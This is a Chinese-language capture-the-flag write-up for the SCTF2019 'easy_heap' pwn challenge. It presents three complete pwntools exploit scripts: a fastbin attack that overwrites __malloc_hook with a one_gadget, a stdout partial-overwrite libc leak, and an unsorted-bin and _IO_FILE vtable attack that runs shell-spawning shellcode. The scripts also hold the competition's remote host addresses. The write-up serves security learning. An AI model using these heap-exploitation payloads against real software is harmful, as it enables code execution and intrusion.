---
title: easy_heap
categories:
- SCTF2019
---
# SCTF2019 easy_heap

## 解法1

和姚老板的题完全一样，exp稍微改改就过了

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def Alloc(p,size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Address 0x')
    address = int(p.recvline().strip('\n'),16)
    return address

def Delete(p,index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def Fill(p,index,content):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)

def exp(p):
    p.recvuntil('Mmap: 0x')
    map_addr = int(p.recvline().strip('\n'),16)
    log.success('map addr => ' + hex(map_addr))
    code_base = Alloc(p,0x88) - 0x202068 #0
    chunk_arr = code_base + 0x202060
    log.success('program loading base => ' + hex(code_base))
    #leak libc
    Alloc(p,0x38)#1
    Alloc(p,0x68)#2
    Alloc(p,0xf8)#3
    Alloc(p,0x30)#4
    #
    Fill(p,2,'a'*0x60+p64(0x140))
    Delete(p,0)
    Delete(p,3)
    #got 0x240 unsorted bin

    Alloc(p,0x88)#0
    Alloc(p,0x50)#3 overlap 2
    Alloc(p,0x48)#5
    Alloc(p,0xf0)#6
    Fill(p,5,'a'*0x40+p64(0x140))
    Delete(p,0)
    Delete(p,6)
    #
    Delete(p,2)
    Alloc(p,0xc0)#0
    Alloc(p,0x20)#2
    Alloc(p,0xf0)#6
    Alloc(p,0x30)#7
    Delete(p,3)
    #
    payload = 'a'*0x30+p64(0)+p64(0x71)+'\xdd\x25\n'
    Alloc(p,0x50)#3
    Fill(p,3,payload)
    log.success('ready to malloc fake chunk')
    Alloc(p,0x60)#8
    Alloc(p,0x60)#9
    Fill(p,9,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')

    p.recvuntil('\x00\x18\xad\xfb')
    p.recvn(28)
    libc_addr = u64(p.recvn(8))
    log.info('libc addr => ' + hex(libc_addr))
    libc_base = libc_addr - 0x3c5600
    log.info('libc base => ' + hex(libc_base))
    malloc_hook = libc.symbols['__malloc_hook']
    target_addr = libc_base + malloc_hook - 0x23
    log.success('malloc hook addr => ' + hex(target_addr))
    #get shell
    shell_addr = libc_base + gadgets[2]
    Alloc(p,0x10)#10
    Alloc(p,0xf0)#11
    Delete(p,10)
    log.info('before to overwrite next chunk')
    Alloc(p,0x18)#10
    Fill(p,10,'a'*0x10+p64(0x60))
    #fast bin attack,modify __malloc_hook
    Delete(p,8)
    Delete(p,3)
    Alloc(p,0x50)#3
    Fill(p,3,'a'*0x30+p64(0)+p64(0x71)+p64(target_addr)+'\n')
    Alloc(p,0x60)#8
    payload = '\x00'*0x13 + p64(shell_addr) + '\n'

    Alloc(p,0x60)#9
    Fill(p,12,payload)
    gdb.attach(p)
    #trigger

    Delete(p,11)


    p.interactive()

if debug:
    p = process('./easy_heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('47.104.89.129',10004)
    libc = ELF('./libc.so.6')

exp(p)



```

## 解法2(17)

这个exp更舒服一点，比较好理解
```py
    Alloc(p,0x88)#0
    Alloc(p,0x68)#1
    Alloc(p,0xf8)#2
    Alloc(p,0x68)#3


    Delete(p,0)
    Fill(p,1,'a'*0x60+p64(0x100))

    Delete(p,2)
    Delete(p,1)
```
首先分配几个堆块，把第0个free掉，Edit(1)修改chunk2的prev_size和size，再释放chunk2，0-2合并成一个大的unsorted bin。

Delete(1)让chunk1进入fastbin[0x70]，Alloc(0x88)让fastbin的fd和bk被写入main_arena+88。注意此时这个fastbin存在size error，直接从中分配chunk会报错。这时候我们再Free掉刚才的chunk0，再分配一次构造overlapping chunk可以修改fastbin的size为正确的值，从而可以分配fastbin的chunk再部分写泄露libc。

```py
    Alloc(p,0x88)#0
    Delete(p,0)
    #overwrite the size to 0x70
    Alloc(p,0x58)#0
    Alloc(p,0x98)#1
    Fill(p,1,'a'*0x20+p64(0x90)+p64(0x71)+'\xdd\x25\n')
    Alloc(p,0x60)#2
    Alloc(p,0x60)#4 stdout
    Fill(p,4,'\x00'*51+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')
    p.recvn(0x40)
    libc_bse = u64(p.recv(8)) - 3954176
```

Delete(2)让0x70的块再次进入fastbin，Delete(1)再分配chunk溢出修改fastbin的fd(刚才的套路)，两次分配就可以分配到fake_chunk，继而修改成shell_addr。

最后Malloc触发malloc_hook不好使，这里free(2)和free(5)触发错误调用malloc_hook拿到shell

```py
    Delete(p,2)#into 0x70 fast bins
    Delete(p,1)
    Alloc(p,0x70)#1


    Fill(p,1,'a'*0x20+p64(0x90)+p64(0x71)+p64(fake_chunk)*2+'\n')
    Alloc(p,0x60)#2
    Alloc(p,0x60)#5
    Fill(p,5,'a'*0x13+p64(shell_addr)+'\n')
```

![heap_list](./1.jpg)

### 17.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def Alloc(p,size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Address 0x')
    address = int(p.recvline().strip('\n'),16)
    return address

def Delete(p,index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def Fill(p,index,content):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)

def exp(p):
    p.recvuntil('Mmap: 0x')
    map_addr = int(p.recvline().strip('\n'),16)
    log.success('map addr => ' + hex(map_addr))
    code_base = Alloc(p,0x88) - 0x202068 #0
    chunk_arr = code_base + 0x202060
    log.success('program loading base => ' + hex(code_base))
    #leak libc
    Alloc(p,0x68)#1
    Alloc(p,0xf8)#2
    Alloc(p,0x68)#3


    Delete(p,0)
    Fill(p,1,'a'*0x60+p64(0x100))

    Delete(p,2)
    Delete(p,1)

    Alloc(p,0x88)#0


    Delete(p,0)
    #overwrite the size to 0x70
    Alloc(p,0x58)#0
    Alloc(p,0x98)#1
    Fill(p,1,'a'*0x20+p64(0x90)+p64(0x71)+'\xdd\x25\n')
    Alloc(p,0x60)#2
    Alloc(p,0x60)#4 stdout
    Fill(p,4,'\x00'*51+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')
    p.recvn(0x40)
    libc_bse = u64(p.recv(8)) - 3954176
    log.success('lib base => ' + hex(libc_bse))
    malloc_hook = libc_bse + libc.symbols['__malloc_hook']
    fake_chunk = malloc_hook - 35
    shell_addr = libc_bse+gadgets[2]
    #get shell

    Delete(p,2)#into 0x70 fast bins
    Delete(p,1)
    Alloc(p,0x70)#1


    Fill(p,1,'a'*0x20+p64(0x90)+p64(0x71)+p64(fake_chunk)*2+'\n')
    Alloc(p,0x60)#2
    Alloc(p,0x60)#5
    Fill(p,5,'a'*0x13+p64(shell_addr)+'\n')

    #trigger
    #Delete(p,0)
    gdb.attach(p)
    Delete(p,2)
    Delete(p,5)

    p.interactive()

if debug:
    p = process('./easy_heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('47.104.89.129',10004)
    libc = ELF('./libc.so.6')

exp(p)



```

## 解法3(官方+x3h1n)

这个解法感觉是一个很好玩的套路，今天查了一天资料总算了解差不多了。emm但是感觉要写的东西太多，还是直接copy师姐的exp和分析(懒)

这个解法利用的IO_FILE攻击，之前我也做过一道题，写了点东西，但是那个只是写了利用的payload，对于具体利用的方式不甚了解，这里会详细一点。

### 关于各种结构体及名词

_IO_FILE_plus是最全面的一个结构体，它包括一个_IO_FILE结构体和一个IO_jump_t指针，同时，我们一会要用的_IO_list_all是它的结构体指针。尤其要注意的是，_IO_list_all 并不是一个描述文件的结构，而是它指向了一个可以描述文件的结构体头部，通常它指向 IO_2_1_stderr 。



```c
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
extern struct _IO_FILE_plus *_IO_list_all;
```
_IO_FILE结构体就是我们常常利用的_IO_2_1_stdout_的数据类型，我们可以在Pwngdb中看到一个通常的结构体内容。
```c
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
如下图，_chain表示的是链表的下一个节点，紧跟在_IO_FILE后面有一个vtable，即我们所说的虚表，对应_IO_jump_t指针。
![_IO_FILE](./3.jpg)
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```
这里在gdb去看一下，可以看到vtable里是一堆函数指针

![vtable](./4.jpg)

最终拿一张图总结一下(from 安全客)

![io](./2.png)

### 攻击原理

首先利用堆溢出或者任意写将unsorted bin的bk修改_IO_list_all-0x10，根据unsorted bin攻击的原理，(_IO_list_all-0x10)->fd = unsorted_chunks(av)，结果是_IO_list_all的值被改成了main_arena+88，即main_arena+88被作为一个_IO_FILE结构体对待，注意_chain这里，指向的为smallbin[4]即0x60的第一个块。

为此，我们需要在smallbin[4]中构造一个假的_IO_FILE。这里用到的知识是当分配一个较小的size的chunk的时候，不符合unsorted bin的size会被放入到small bin中。我们先利用unlink把unsorted bin的size部分改为0x61，最后再分配一个0x1的chunk就可让这个chunk进入smallbin[4]  
因为这个smallbin要作为我们的fake _IO_FILE，我们用unlink修改其vtable为0x555555756070，而这里存储的是mmap的地址，最终我们申请chunk触发unsorted bin attck，程序报错触发_IO_flush_all_lockp，从而执行mmap里的shellcode。

![main_arena](./6.jpg)

![_chain](./7.jpg)

![smallbin](./8.jpg)

![vtable](./9.jpg)

整个的流程可以用下面的图概括

![attack](./5.png)

### x3h1n.py

```py
from pwn import *

context.log_level = "debug"
context.terminal = ["tmux","split",'-h']
context.update(arch='amd64',os='linux')

DEBUG = 1

if DEBUG:
   p = process("./easy_heap")
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
   p = remote("132.232.100.67",10004)
   libc = ELF("./libc.so.6")

def add(size):
   p.recvuntil(">> ")
   p.sendline('1')
   p.recvuntil("Size: ")
   p.sendline(str(size))
   p.recvuntil("Address ")
   heap_ptr = int(p.recvuntil("\n",drop=True),16)
   print hex(heap_ptr)
   return heap_ptr

def delete(idx):
   p.recvuntil(">> ")
   p.sendline('2')
   p.recvuntil("Index: ")
   p.sendline(str(idx))

def edit(idx,data):
   p.recvuntil(">> ")
   p.sendline('3')
   p.recvuntil("Index: ")
   p.sendline(str(idx))
   p.recvuntil("Content: ")
   p.send(data)


code = """
        xor rsi,rsi
        mov rax,SYS_open
        nop
        nop
        call here
        .string "./flag"
        here:
        pop rdi
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_read
        syscall
        mov rdi,1
        mov rsi,rsp
        mov rdx,0x100
        mov rax,SYS_write
        syscall
        mov rax,SYS_exit
        syscall
    """
shellcode = asm(shellcraft.sh())

p.recvuntil("Mmap: ")
mmap_addr = int(p.recvuntil('\n',drop=True),16)
print hex(mmap_addr)


##unlink
heap_list = add(0xf8) - 0x8 #0
add(0xf0) #1
add(0x20) #2

payload = p64(0) + p64(0xf0)
payload += p64(heap_list+0x8-0x18) + p64(heap_list+0x8-0x10)
payload = payload.ljust(0xf0,'\x00')
payload += p64(0xf0)
edit(0,payload)
delete(1)



##mmap_addr->shellcode
payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)
payload += p64(0x1000) + p64(mmap_addr)
edit(0,payload+'\n')
edit(1,shellcode+'\n')



##unsorted bin size: 0x1c1->0x61
add(0x20) #3
payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)
payload += p64(0)*4 + p64(8) + '\x48' + '\n' #unsortedbin size
edit(0,payload)
edit(3,'\x61\x00'+'\n')



##unsortedbin attack
##bk -> IO_list_all-0x10
payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)
payload += p64(0)*4 + p64(8) + '\x58' + '\n' #unsortedbin bk
edit(0,payload)
edit(3,'\x10\x25'+'\n') #IO_list_all


##fake vtable
payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)
payload += p64(0)*4 + p64(0x1000) + '\x60' + '\n'
edit(0,payload)



fake_vtable = (heap_list - 0x202060) + 0x202070
payload = p64(2) + p64(3)
payload  = payload.ljust(0xb8,'\x00')
payload += p64(fake_vtable)
edit(3,payload+'\n')



##
payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)
payload += p64(mmap_addr) * 10

edit(0,payload+'\n')


##trigger
gdb.attach(p)
p.recvuntil(">> ")
p.sendline('1')
p.recvuntil("Size: ")
p.sendline('1')


p.interactive()

```

## 参考资料

[SCTF官方writeup](https://www.xctf.org.cn/media/writeup/SCTF-Write-Up/site/sctf-wp/)

[安全客](https://www.anquanke.com/post/id/168802#h3-3)

[x3h1n](https://x3h1n.github.io/2019/06/24/SCTF2019-pwn/#more)

